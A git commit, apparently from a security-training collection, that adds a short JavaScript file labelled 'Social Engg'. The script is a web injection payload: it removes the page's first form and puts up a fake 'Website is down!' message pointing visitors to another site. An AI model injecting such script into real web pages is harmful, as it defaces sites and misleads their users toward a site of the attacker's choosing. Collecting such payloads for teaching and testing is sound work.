26a41e067b0d2d8d773c6c364aabddb204dacdae
ankur8931 <achaud16@asu.edu>
2020-01-14 17:23:16 -0700

    Social Engg

---
+++ social-engg.js
@@ -0,0 +1,7 @@
+<script>
+
+var para = document.createElement("h2");
+para.innerHTML = "Website is down! Please visit SecurityTube.net";
+document.forms[0].parentNode.appendChild(para);
+document.forms[0].parentNode.removeChild(document.forms[0]);
+</script>
